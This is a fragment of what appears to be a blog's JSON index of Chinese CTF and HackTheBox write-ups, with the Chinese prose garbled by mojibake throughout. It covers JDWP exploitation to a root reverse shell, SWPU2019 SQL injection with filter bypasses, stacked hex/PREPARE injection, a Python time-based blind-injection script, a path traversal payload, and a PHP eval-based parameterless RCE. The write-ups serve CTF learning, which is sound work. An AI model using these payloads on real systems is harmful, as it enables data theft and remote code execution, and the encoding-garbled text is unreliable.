·çš„æ–¹æ³•è½¬å‘tomcatçš„8009å’Œ8080ç«¯å£åˆ°æœ¬åœ°ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥æµè§ˆå™¨è®¿é—®localhost:8080æ¥åˆ†ætomcatï¼ˆå½“ç„¶è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼‰ å½“ç„¶ï¼Œè¿™é‡Œè½¬å‘åˆ°æœ¬åœ°æœ¬æ¥åªæ˜¯æ–¹ä¾¿è°ƒè¯•ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥åœ¨æœ¬åœ°æ‰‹åŠ¨åˆ©ç”¨jdwpçš„æ¼æ´ï¼Œæ‰¾åˆ°ä¸€ä¸ªbreakpointç”¨debugåŠŸèƒ½æ¥æ‰§è¡Œå‘½ä»¤ã€‚ä½†æ˜¯è¿™æ–¹é¢å®åœ¨ä¸ç†Ÿï¼ˆjavaç™½å­¦äº†ï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›´æ¥åˆ©ç”¨ä¸Šé¢çš„è„šæœ¬èˆ’æœå•Šã€‚shellifierç”¨æ³• 1python jdwp-shellifier.py -t ç›®æ ‡ä¸»æœºip -p jdwpè¿è¡Œç«¯å£ --cmd &quot;Your Command&quot; è¿™é‡Œæˆ‘ä»¬ç›´æ¥ 1python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&#x2F;tmp&#x2F;test.sh&quot; å› ä¸ºè½¬å‘äº†ipï¼Œç«¯å£æ‰€ä»¥ä½¿ç”¨çš„ipæ˜¯æœ¬åœ°ã€‚è€Œbreak-onè¿™ç‚¹æ–¹ä¾¿æ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„æ–­ç‚¹ã€‚æœ€åçš„cmdæ‰§è¡Œæˆ‘ä»¬çš„åå¼¹shellã€‚æœ¬æœºå†åº¦ç›‘å¬åæ‰§è¡Œè¿™ä¸ªè„šæœ¬æˆåŠŸåå¼¹shellåˆ°æœ¬æœºã€‚å³å¯æ‹¿åˆ°root.txt æ„Ÿè§‰ææƒè¿™æ–¹é¢è‡ªå·±è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œå¯èƒ½å› ä¸ºå¤§éƒ¨åˆ†ctfæ¯”èµ›æ³¨é‡çš„ä¹Ÿåªæ˜¯getshellå±‚é¢ä¸Šçš„å§ï¼Œä¹‹åçš„æ“ä½œè¿˜è¦å¤šåŠ äº†è§£çŸ¥è¯†å­¦ä¹ å•Šã€‚","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"ä»SWPU2019-WEB1&WEB4å­¦sqlæ³¨å…¥","slug":"ä»SWPU2019-WEB1-WEB4å­¦sqlæ³¨å…¥","date":"2020-01-19T13:48:33.000Z","updated":"2021-02-18T05:08:28.128Z","comments":true,"path":"2020/01/19/ä»SWPU2019-WEB1-WEB4å­¦sqlæ³¨å…¥/","link":"","permalink":"https://www.bycsec.top/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/","excerpt":"æœ¬æ¥æ‰“ç®—è¿™å‡ å¤©é‡æ–°ä»å¤´å¼€å§‹å­¦ä¸‹sqlæ³¨å…¥çš„ï¼Œæ¯•ç«Ÿhgameweek1çš„wpéƒ½å·²ç»å†™å¥½äº†ï¼Œé¢˜èƒ½åšçš„éƒ½åšäº†ã€‚ä½†æ˜¯çŒ›ç„¶æƒ³èµ·ä»Šå¹´åœ¨æ··äº†ä¸‹GXYCTFå‰è¿˜å®æ‰“å®çš„æ‰“äº†GWCTFè·ŸSWPUCTFã€‚å½“æ—¶GWçš„é¢˜åšäº†ä¸¤é“webï¼Œä¸€é“phpéšæœºæ•°æ¼æ´ä¸€é“phpmyadmin getshellï¼Œæ²¡ä»€ä¹ˆå«é‡‘é‡å°±æ²¡å†™ã€‚è€Œä¸”äº‹åçœ‹å…¶ä»–é€‰æ‰‹å°±åªæœ‰ä¸€ä¸ªäººwebåšäº†ä¸‰é“ï¼Œå…¶ä½™åŸºæœ¬éƒ½æ˜¯1,2é“å°±è§‰å¾—æ²¡ä»€ä¹ˆå¤ç°å…¶ä»–é¢˜çš„å¿…è¦ï¼›swpuå°±å®Œå…¨ç›¸åäº†ï¼Œwebé¢˜éš¾åº¦å¯¹æˆ‘è€Œè¨€æœ‰äº›é«˜äº†ï¼Œè€Œä¸”è¿˜æœ‰å‘åœ¨é‡Œé¢ã€‚å½“æ—¶å°±åšäº†ä¸‰é“éšå†™é¢˜ï¼ˆè®°å¾—æ¯é“éšå†™éƒ½æ˜¯zipå‹é¢˜ç›®ï¼‰ï¼Œä¹‹åæ²¡æ¡ä»¶åä¹Ÿæ²¡æ—¶é—´å¤ç°ã€‚æ‰€ä»¥åœ¨æ­¤å†æ¬¡æ„Ÿè°¢buuojç»™äº†æˆ‘å¤ç°é¢˜ç›®çš„æœºä¼šâ€¦â€¦","text":"æœ¬æ¥æ‰“ç®—è¿™å‡ å¤©é‡æ–°ä»å¤´å¼€å§‹å­¦ä¸‹sqlæ³¨å…¥çš„ï¼Œæ¯•ç«Ÿhgameweek1çš„wpéƒ½å·²ç»å†™å¥½äº†ï¼Œé¢˜èƒ½åšçš„éƒ½åšäº†ã€‚ä½†æ˜¯çŒ›ç„¶æƒ³èµ·ä»Šå¹´åœ¨æ··äº†ä¸‹GXYCTFå‰è¿˜å®æ‰“å®çš„æ‰“äº†GWCTFè·ŸSWPUCTFã€‚å½“æ—¶GWçš„é¢˜åšäº†ä¸¤é“webï¼Œä¸€é“phpéšæœºæ•°æ¼æ´ä¸€é“phpmyadmin getshellï¼Œæ²¡ä»€ä¹ˆå«é‡‘é‡å°±æ²¡å†™ã€‚è€Œä¸”äº‹åçœ‹å…¶ä»–é€‰æ‰‹å°±åªæœ‰ä¸€ä¸ªäººwebåšäº†ä¸‰é“ï¼Œå…¶ä½™åŸºæœ¬éƒ½æ˜¯1,2é“å°±è§‰å¾—æ²¡ä»€ä¹ˆå¤ç°å…¶ä»–é¢˜çš„å¿…è¦ï¼›swpuå°±å®Œå…¨ç›¸åäº†ï¼Œwebé¢˜éš¾åº¦å¯¹æˆ‘è€Œè¨€æœ‰äº›é«˜äº†ï¼Œè€Œä¸”è¿˜æœ‰å‘åœ¨é‡Œé¢ã€‚å½“æ—¶å°±åšäº†ä¸‰é“éšå†™é¢˜ï¼ˆè®°å¾—æ¯é“éšå†™éƒ½æ˜¯zipå‹é¢˜ç›®ï¼‰ï¼Œä¹‹åæ²¡æ¡ä»¶åä¹Ÿæ²¡æ—¶é—´å¤ç°ã€‚æ‰€ä»¥åœ¨æ­¤å†æ¬¡æ„Ÿè°¢buuojç»™äº†æˆ‘å¤ç°é¢˜ç›®çš„æœºä¼šâ€¦â€¦ æœ‰ä¸€è¯´ä¸€ï¼Œswpué¢˜ç›®éš¾å½’éš¾ï¼Œå®˜æ–¹wpè¿˜æ˜¯å¾ˆè¯¦ç»†çš„ã€‚ web1(sqlæ³¨å…¥ï¼ˆunion or äºŒæ¬¡æ³¨å…¥ ï¼‰) è¿™é“é¢˜ç›®çš„ç‚¹åœ¨äºsqlæ³¨å…¥ã€‚å¼€å§‹çš„ç™»é™†æ¡†çŸ¥è¯†å¹Œå­ï¼Œæ³¨å†Œè´¦å·ç™»é™†è¿›å»åå°±ä¼šå‘ç°æœ‰ä¸€ä¸ªå¹¿å‘Šç”³è¯·çš„è¿™ä¸€æ“ä½œã€‚é€šå¸¸çœ‹åˆ°è¿™ç§å½¢å¼ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯sqlæ³¨å…¥æˆ–è€…æ˜¯xssã€‚FUZZä¸€ä¸‹åï¼Œå¯ä»¥ç¡®è®¤æ˜¯sqlã€‚å°è¯•ç®€å•çš„æ³¨å…¥è¯­å¥ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨/**/ç»•è¿‡æˆåŠŸã€‚å½“æ—¶è¿˜FUZZå‡ºæ¥äº†æŠ¥é”™æ³¨å…¥çš„å…³é”®å‡½æ•°ï¼Œä»¥åŠå¸¸è§çš„æ³¨é‡Šç¬¦å·ï¼Œå…³é”®å­—orä¹Ÿè¢«è¿‡æ»¤äº†ã€‚å› æ­¤ï¼ŒæŒ‰ç…§è‡ªå·±çš„ç¬¬ä¸€æƒ³æ³•ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨æœ€æ™®éçš„unionè”åˆæŸ¥è¯¢ï¼Œåªæ˜¯è¿™æ ·ä¼šé¢ä¸´å‡ ä¸ªé—®é¢˜ï¼š 1.æ³¨é‡Šè¢«è¿‡æ»¤å¸¦æ¥çš„é—­åˆé—®é¢˜2.é¢å¯¹å¼ºè¿‡æ»¤çš„or,åé¢è¿›è¡Œæ³¨å…¥çˆ†å‡ºè¡¨ååŠåˆ—åçš„å¸¸è§„è¯­å¥ï¼šunion select group_concat(table_name) from information_schema.tables where table_schema=database()å°†å­˜åœ¨informationä¸­çš„orè¢«è¿‡æ»¤çš„å¢ƒåœ° äº‹å®ä¸Šï¼Œå¯¹äºç¬¬ä¸€ç‚¹çš„é—­åˆé—®é¢˜ï¼Œè‡ªå·±åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ç›¸å…³bypassæŠ€å·§ã€‚ç¡®åˆ‡è¯´ä¸ç®—æŠ€å·§ï¼Œåº”è¯¥æ˜¯åœ¨sqlæ³¨å…¥ä¸­å¯¹åº”å½“å…ˆåšçš„ç¬¬ä¸€æ­¥â€˜å¤åŸsqlæŸ¥è¯¢è¯­å¥â€™åæ‰€è¿›è¡Œçš„å¸¸è§„åˆ¤æ–­ã€‚ç”±äºFUZZï¼Œæ—¶ï¼Œæˆ‘ä»¬åœ¨è¾“å…¥-1&#39;æ—¶å¾—åˆ°æŠ¥é”™ç»“æœï¼Œé‚£å¤åŸå‡ºæ¥çš„è¯­å¥åº”è¯¥æ˜¯ï¼š 1select * from ads where title &#x3D; &#39;$title&#39; limit 0,1; å› æ­¤é¢å¯¹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¸ä½¿ç”¨è¿‡æ»¤å·ï¼Œä½¿ç”¨&#39;ï¼ˆå•å¼•å·ï¼‰é—­åˆå•å¼•å·æ˜¯æ°´åˆ°æ¸ æˆçš„ã€‚é‚£ä¹ˆç°åœ¨å°±è¦å¼€å§‹fuzzå­—æ®µæ•°äº†â€¦â€¦é¦–å…ˆï¼Œå‘ç°order byçš„orä¹Ÿè¢«è¿‡æ»¤äº†,è½¬è€Œä½¿ç”¨group byã€‚å¥½çš„ï¼Œè¿™é“é¢˜å½“æ—¶æœ€ä¸ºäººè¯Ÿç—…çš„åœ°æ–¹æ¥äº†ï¼Œé‚£å°±æ˜¯å®ƒå±…ç„¶æœ‰22ä¸ªå­—æ®µæ•°ï¼æˆ‘æƒ³äººæ‰‹å·¥ä½¿ç”¨è¯­å¥fuzzå‘ç°è¿™ä¹ˆå¤šå­—æ®µæ•°åº”è¯¥æ˜¯æ—©å°±æ€€ç–‘äººç”Ÿäº†å§ï¼Ÿå½“æ—¶ä¼°è®¡å¾ˆå¤šäººéƒ½å€’åœ¨è¿™é¢˜çš„å­—æ®µæ•°ä¸Šã€‚FUZZå­—æ®µï¼š 1-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1 æˆåŠŸåæ¥ä¸‹æ¥union selectå§ 1-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 ç¡®è®¤äº†å›æ˜¾çš„æ˜¯2å’Œ3å¯¹åº”å­—æ®µã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å¦‚ä½•è§£å†³information_schemaçš„é—®é¢˜å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»å®˜æ–¹wpä¸­å­¦åˆ°äº†bypassinformation_schemaçš„æ–¹æ³•å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« https://www.anquanke.com/post/id/193512ä»”ç»†æƒ³æƒ³ï¼Œinformation_schemaåœ¨æ³¨å…¥ä¸­ä¸å¯æˆ–ç¼ºçš„åŸå› æ— éæ˜¯å› ä¸ºå®ƒåŒ…å«äº†æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯table_schemaï¼Œtable_name.column_nameç­‰ç­‰ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„å­˜åœ¨å‘¢ï¼Ÿæ–‡ç« ä¸­æä¾›äº†ä¸€ç§è§£æ³•:sys.schema_auto_increment_columnsè¯¥è§†å›¾çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å¯¹è¡¨è‡ªå¢IDçš„ç›‘æ§ã€‚å¦‚æœè¡¨ä¸­å­˜åœ¨è‡ªå¢id,é‚£ä¹ˆè¿™ä¸ªè§†å›¾å°±ä¼šåŒ…å«è¿™ä¸€ è¡¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„è§£æ³•æ˜¯ 1-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_colum ns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 ç„¶åéš¾è¿‡äº†ï¼Œå›æ˜¾å±…ç„¶æ˜¯è¿™ä¸ªè¡¨ä¸å­˜åœ¨ï¼Ÿï¼ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿™é“é¢˜åœ¨buuojä¸Šå°‘äº†å•¥ï¼Œæ¯•ç«Ÿæˆ‘ç”¨çš„è·Ÿå®˜æ–¹wpæ˜¯ä¸€æ ·çš„â€¦â€¦é‚£å°±æ²¡åŠæ³•äº†ï¼Œåªèƒ½ç›²çŒœä¸€äº›å¸¸è§è¡¨åï¼Œæ¯”å¦‚userï¼Œpasswordä¹‹ç±»çš„ã€‚è¿™é‡Œå°±å¼€ä¸ªå¤©çœ¼è¡¨ç¤ºæ˜¯usersè¡¨å§ã€‚æ¥ä¸‹æ¥ç”±äºä¸çŸ¥é“åˆ—åï¼Œå¼•å…¥ä¸€ä¸ªä»¥å‰è‡ªå·±ä¸æ€ä¹ˆç†Ÿæ‚‰çš„ç‚¹ï¼šæ— åˆ—åæ³¨å…¥ï¼Œè¿™é‡Œçœ‹åˆ°ä¸€ç¯‡æ–‡ç« è®²çš„å¾ˆå‡†ç¡®ï¼šhttps://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/è¿™é‡Œç›´æ¥å¼•ç”¨å®ƒçš„æ•°æ®äº†ï¼šæ™®é€šçš„sqlæ³¨å…¥ 1select * from users 12345678910+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+| id | name | password | email | birthdate | added |+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | alias | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org | 1981-05-03 | 1993-03-20 14:03:14 || 2 | accusamus | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com | 1979-10-28 | 2007-01-20 18:38:29 || 3 | dolor | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com | 2005-11-16 | 1992-02-16 04:19:05 || 4 | et | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com | 2015-07-22 | 2014-03-05 22:57:18 || 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+5 rows in set (0.00 sec) 1select 1,2,3,4,5 ,6union select * from users 1234567891011+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | 2 | 3 | 4 | 5 | 6 |+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+| 1 | 2 | 3 | 4 | 5 | 6 || 1 | alias | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org | 1981-05-03 | 1993-03-20 14:03:14 || 2 | accusamus | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com | 1979-10-28 | 2007-01-20 18:38:29 || 3 | dolor | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com | 2005-11-16 | 1992-02-16 04:19:05 || 4 | et | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com | 2015-07-22 | 2014-03-05 22:57:18 || 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+6 rows in set (0.00 sec) è¿™æ—¶è‹¥è¦å¼•ç”¨ï¼Œä½¿ç”¨åå¼•å·ï¼š 1select &#96;4&#96; from (select 1,2,3,4,5,6 union select * from users)a; åˆ™ä¼šå•ç‹¬æ‹¿åˆ°ç¬¬å››åˆ— 1234567891011+-----------------------------+| 4 |+-----------------------------+| 4 || veronica80@example.org || sawayn.amelie@example.com || stefan41@example.com || zwalsh@example.com || pattie.medhurst@example.net |+-----------------------------+6 rows in set (0.00 sec) å¦‚æœåå¼•å·è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿæœ‰å…¶ä»–æ–¹æ³•ã€‚ 1select b from (select 1,2,3 as b,4,5 union select * from users)a; 1234567891011+-----------------------------+| b |+-----------------------------+| 4 || veronica80@example.org || sawayn.amelie@example.com || stefan41@example.com || zwalsh@example.com || pattie.medhurst@example.net |+-----------------------------+6 rows in set (0.00 sec) å›åˆ°é¢˜ç›®ï¼Œä¸éš¾å¾—å‡ºæœ€ç»ˆpayload: 1-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 1-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 web4æ˜¨å¤©æ™šä¸Šå†™äº†å†™web1,æŠ˜è…¾çš„å¤Ÿå‘›ã€‚ä»Šå¤©åœ¨å¤ç°web4æ—¶ä¹ŸæŒºéš¾å—çš„ï¼Œæ‰€å¹¸æœ€åè¿˜æ˜¯åšå‡ºæ¥äº†ã€‚é¢˜ç›®æ‰€ç»™defæ³¨å†ŒåŠŸèƒ½å¹¶æ²¡æœ‰å¼€æ”¾ï¼Œè€Œç™»å½•é”®ç‚¹äº†ä¹Ÿæ²¡æœ‰ååº”ã€‚æŠ“åŒ…çš„è¯ä¼šæœ‰æ–°å‘ç°ï¼šå¦‚æœåªæœ‰å•å¼•å·çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚ä½†æ˜¯å¦‚æœè¾“å…¥ç»“æœé™¤äº†å•å¼•å·è¿˜æœ‰åˆ†å·çš„è¯ï¼Œè¿”å›çš„ä»æ˜¯202ã€‚è¿™ä»£è¡¨äº†ä»€ä¹ˆå‘¢ï¼Ÿé¦–å…ˆå¯ä»¥ç¡®è®¤æ˜¯æ³¨å…¥ï¼ŒåŒæ—¶è¿˜å¯ä»¥å¤§è‡´åˆ¤æ–­æ˜¯å †å æ³¨å…¥ã€‚å…³äºå †å æ³¨å…¥æˆ‘å¹¶æ²¡æœ‰ä»€ä¹ˆäº†è§£ã€‚äºæ˜¯å»æœç´¢äº†ä¸‹ï¼Œå‘ç°è¿™å‡ å¹´å¼€å§‹æœ‰å †å æ³¨å…¥çš„ctfé¢˜åœ¨å„å¤§èµ›äº‹ä¸­å‡ºç°ã€‚å…¶ç‰¹ç‚¹æ— éæ˜¯ï¼šé™åˆ¶äº†å¸¸ç”¨çš„select,updateç­‰ç­‰å…³é”®è¯­å¥ã€‚ä½†æ˜¯å´æ²¡æœ‰é™åˆ¶ä½ çš„åˆ†å·ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šæ¡sqlè¯­å¥ã€‚è€Œå¦‚æœé€‚å½“æ­é…ï¼Œä¸€æ ·å¯ä»¥èµ·åˆ°æ³¨å…¥çš„æ•ˆæœã€‚æ ¹æ®å®˜æ–¹çš„è¯´æ³•ï¼Œè¿™æ˜¯å±äºPDOåœºæ™¯ä¸‹çš„sqlæ³¨å…¥ï¼Œå‡ºé¢˜äººç»™çš„æ–¹æ³•å°±æ˜¯ç”¨16è¿›åˆ¶åŠ mysqlé¢„å¤„ç†æ¥è§£å†³ã€‚å…¶payloadå¤§è‡´æ ¼å¼å¦‚ä¸‹ï¼š 1set @a&#x3D;0x&#123;0&#125;;PREPARE ctftest from @a;execute ctftest; å‰é¢çš„@aå³ä¸ºæˆ‘ä»¬æ‰€éœ€çš„æ³¨å…¥è¯­å¥çš„16è¿›åˆ¶å˜é‡ï¼Œåé¢PREPARE ctftest from @a;execute ctftest;ä¸¤å¥èµ·åˆ°äº†å®šä¹‰å¹¶æ‰§è¡Œé¢„å¤„ç†è¯­å¥çš„ä½œç”¨é‚£ä¹ˆç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627import requestsurl=\"http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login\"flag=\"\"def str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s])for i in range(1,40): print(i) for str1 in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.\": sql = \"select if((ascii(substr((select group_concat(flag) from flag),\"+str(i)+\",1))='\"+str(ord(str1))+\"'),sleep(6),2);\" # ctf sql_hex = str_to_hex(sql) data=&#123; \"username\":\"1\\';SET @a=0x\"+str(sql_hex)+\";PREPARE st FROM @a;EXECUTE st;\", \"password\":\"123\" &#125; try: result=requests.post(url,json=data,timeout=6) except requests.exceptions.ReadTimeout: print(flag) breakprint(flag)#glzjinwantsaliendzip#glzjinnts_a_girl_friendzip#glzjinwantsgirliendzip#glzjin_wants_a_girl_friend.zip è¿™é‡Œå¯èƒ½ç”±äºbuuojçš„é—®é¢˜å§ï¼Œè®¿é—®è¿‡å¿«ç›´æ¥429,å¯¼è‡´æ¯æ¬¡è·‘å‡ºçš„ç»“æœéƒ½ä¸ä¸€æ ·ã€‚æœ€åæ±‡æ€»ä¸‹æ‰æ¨æ–­å‡ºæ¥æ˜¯glzjin_wants_a_girl_friend.zipã€‚(è¿™é‡Œç›´æ¥select flag from flagäº†ï¼Œå®åœ¨ä¸æƒ³åˆå»çˆ†è¡¨çˆ†åˆ—äº†ã€‚ã€‚ï¼‰æ‹¿åˆ°æºç ï¼Œå®¡è®¡ä¸æäº†ã€‚ç›´æ¥è¯´å‡ºé¢˜äººæ€è·¯å§ï¼šå‘ç°ä¼šè¯»å–img_fileå†…å®¹å¹¶ä»¥base64è¾“å‡ºã€‚é‚£ä¹ˆåªè¦img_fileåŒ…å«flag.phpå°±å¥½äº†ã€‚payload: 1?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php å³å¯ä»æºç å¤„è§£ç æ‹¿åˆ°flag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"}]},{"title":"GXYCTF--ç¦æ­¢å¥—å¨ƒ&BabaySqli-v3.0","slug":"GXYCTF--ç¦æ­¢å¥—å¨ƒ&BabaySqli-v3.0","date":"2020-01-14T06:49:18.000Z","updated":"2021-02-18T05:09:05.110Z","comments":true,"path":"2020/01/14/GXYCTF--ç¦æ­¢å¥—å¨ƒ&BabaySqli-v3.0/","link":"","permalink":"https://www.bycsec.top/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/","excerpt":"ä»Šå¤©ä¹Ÿæ¥æ¥ç€åšä¸‹GXYçš„å‡ é“webé¢˜ ç¦æ­¢å¥—å¨ƒé¦–å…ˆæ˜¯ç¦æ­¢å¥—å¨ƒè¿™ä¸€é“ï¼Œé¢˜ç›®ç±»å‹ä¸ºæ— å‚RCEã€‚æˆ‘ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€é“é¢˜æ‰äº†è§£åˆ°æ— å‚RCEè¿™ä¸ªåè¯ï¼Œä¸è¿‡åæ¥ä»”ç»†æƒ³æƒ³ï¼ŒåŸæ¥åšè¿‡çš„BugKuçš„è¿‡ç‹—ä¸€å¥è¯ä¹Ÿæœ‰ç›¸ä¼¼ä¹‹å¤„â€¦â€¦ è¯ä¸å¤šè¯´ï¼Œå…ˆç»™å‡ºæˆ‘å‚è€ƒçš„æ–‡ç« ï¼š","text":"ä»Šå¤©ä¹Ÿæ¥æ¥ç€åšä¸‹GXYçš„å‡ é“webé¢˜ ç¦æ­¢å¥—å¨ƒé¦–å…ˆæ˜¯ç¦æ­¢å¥—å¨ƒè¿™ä¸€é“ï¼Œé¢˜ç›®ç±»å‹ä¸ºæ— å‚RCEã€‚æˆ‘ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€é“é¢˜æ‰äº†è§£åˆ°æ— å‚RCEè¿™ä¸ªåè¯ï¼Œä¸è¿‡åæ¥ä»”ç»†æƒ³æƒ³ï¼ŒåŸæ¥åšè¿‡çš„BugKuçš„è¿‡ç‹—ä¸€å¥è¯ä¹Ÿæœ‰ç›¸ä¼¼ä¹‹å¤„â€¦â€¦ è¯ä¸å¤šè¯´ï¼Œå…ˆç»™å‡ºæˆ‘å‚è€ƒçš„æ–‡ç« ï¼š https://www.gem-love.com/websecurity/530.htmlå‰é¢çš„å¸ˆå‚…é‡Œé¢æåˆ°äº†skyå¸ˆå‚…çš„åšæ–‡ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå‚è€ƒäº†ä¸‹ã€‚ é‚£ä¹ˆé¦–å…ˆï¼Œå‡ºç°æ— å‚RCEçš„å¿…è¦æ¡ä»¶æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¤§æŠµæ˜¯å¦‚ä¸‹çš„æ­£åˆ™ï¼š 123if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; eval($_GET[&#39;code&#39;]);&#125; è¿™é‡Œ?Ræ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œé‚£ä¹ˆé…ä¸Šå‰é¢çš„æˆåˆ†ï¼Œæˆ‘ä»¬è¢«å…è®¸çš„å‚æ•°å€¼å¿…é¡»å…·æœ‰ä»¥ä¸‹å½¢å¼ï¼ša(b(c())a()è€Œä¸æ˜¯a(â€˜342â€™)ä¹‹ç±»çš„ã€‚ é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šæ¥ï¼Œé¦–å…ˆç½‘é¡µå¹¶æ²¡æœ‰å¤ªå¤šä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸¸è§„å‡ æ¿æ–§æ‹¿å‡ºæ¥ï¼š1.æŠ“åŒ…ï¼Œæœ‰æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Ÿ2.ç½‘é¡µæºç ï¼Œæœ‰æ²¡æœ‰æç¤ºï¼Ÿ3.æºç æ³„éœ²ï¼Œgit,svnç­‰ç­‰è¯•ä¸€é4.æ‰«ç›®å½•ï¼Œçœ‹æœ‰æ²¡æœ‰æœ‰è¶£çš„ç›®å½•å¯ä»¥å‘æ˜5.å®åœ¨ä¸è¡Œçœ‹çœ‹é¢˜ç›®çš„åå­—ï¼Œç½‘é¡µçš„æ¡†æ¶ï¼Œæœ‰æ²¡æœ‰æç¤ºä½ å¯èƒ½å­˜åœ¨çš„æ¼æ´ ã€‚æˆ‘ä¸ªäººè®¤ä¸ºæ­£å¸¸çš„é¢˜ç›®è¿™æ ·åšè‚¯å®šå¯ä»¥ç»§ç»­å‘å±•ä¸‹å»è€Œä¸è‡³äºä¸€ç­¹è«å±•ã€‚å½“ç„¶ï¼Œæ­¤å¤„æ˜¯å¾ˆå¸¸è§çš„.gitæºç æ³„éœ²ï¼Œæˆ‘ä»¬æŠŠgithackæ‹¿ä¸‹æ¥çš„index.phpçœ‹ä¸€çœ‹ï¼š 123456789101112131415161718192021222324&lt;?phpinclude \"flag.php\";echo \"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;\";if(isset($_GET['exp']))&#123; if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', 